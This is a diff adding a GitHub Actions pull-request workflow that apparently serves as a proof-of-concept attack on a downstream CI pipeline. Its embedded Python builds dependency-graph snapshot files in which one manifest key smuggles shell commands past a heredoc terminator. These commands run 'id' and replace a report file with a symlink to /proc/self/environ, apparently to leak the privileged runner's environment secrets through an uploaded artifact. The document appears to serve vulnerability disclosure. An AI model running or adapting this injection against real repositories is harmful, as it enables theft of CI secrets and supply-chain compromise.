@@ -1,0 +1,81 @@
+name: PR Workflow
+
+on:
+  pull_request:
+    branches: [development]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft attacker-controlled dependency graph
+        env:
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          PR_NUM: ${{ github.event.pull_request.number }}
+        run: |
+          mkdir -p dependency-graph-reports
+          touch payload-marker.txt
+          python3 - <<'PY'
+          import json, os
+
+          head = os.environ['HEAD_SHA']
+          base = os.environ['BASE_SHA']
+          n = os.environ['PR_NUM']
+
+          evil_key = (
+              "poc-manifest\n"
+              "EOF\n"
+              "id\n"
+              "readlink openssf-report.html || true\n"
+              "rm -f openssf-report.html\n"
+              "ln -s /proc/self/environ openssf-report.html\n"
+              "readlink openssf-report.html\n"
+              "exit 0\n"
+          )
+
+          def manifest(name, purl):
+              return {
+                  "name": name,
+                  "file": {"source_location": name},
+                  "resolved": {purl: {"relationship": "direct", "dependencies": []}},
+              }
+
+          def snapshot(sha, ref, manifests):
+              return {
+                  "version": 0,
+                  "job": {"correlator": "poc", "id": "poc"},
+                  "sha": sha,
+                  "ref": ref,
+                  "detector": {"name": "poc", "version": "1.0.0", "url": "https://example.com"},
+                  "manifests": manifests,
+              }
+
+          common = manifest(
+              "build.gradle.kts",
+              "pkg:maven/org.apache.commons/commons-lang3@3.12.0",
+          )
+          bumped = manifest(
+              "build.gradle.kts",
+              "pkg:maven/org.apache.commons/commons-lang3@3.13.0",
+          )
+
+          base_snapshot = snapshot(base, "refs/heads/development", {"build.gradle.kts": common})
+          head_snapshot = snapshot(
+              head,
+              "refs/pull/%s/head" % n,
+              {"build.gradle.kts": bumped, evil_key: manifest("poc-manifest", "pkg:maven/com.example/evil@1.0.0")},
+          )
+
+          json.dump(base_snapshot, open("dependency-graph-reports/snapshot-base.json", "w"))
+          json.dump(head_snapshot, open("dependency-graph-reports/snapshot-head.json", "w"))
+          PY
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_snapshot.json
+          path: |
+            dependency-graph-reports/
+            payload-marker.txt
